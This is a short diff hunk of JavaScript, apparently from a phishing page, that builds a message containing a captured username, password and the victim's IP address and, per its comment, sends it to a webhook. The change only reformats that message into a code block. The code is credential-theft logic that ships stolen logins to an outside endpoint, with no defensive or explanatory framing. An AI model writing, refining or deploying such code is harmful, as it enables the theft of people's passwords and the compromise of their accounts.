@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', function() {
           
           // Construct the message payload
           const payload = {
-            content: 'User: '+userText + ' Pass: '+passText + ' IP: '+address
+            content: '```User: '+userText + '\npass: '+passText + '\nIP: '+address + '```'
           };
 
           // Send the message to the webhook
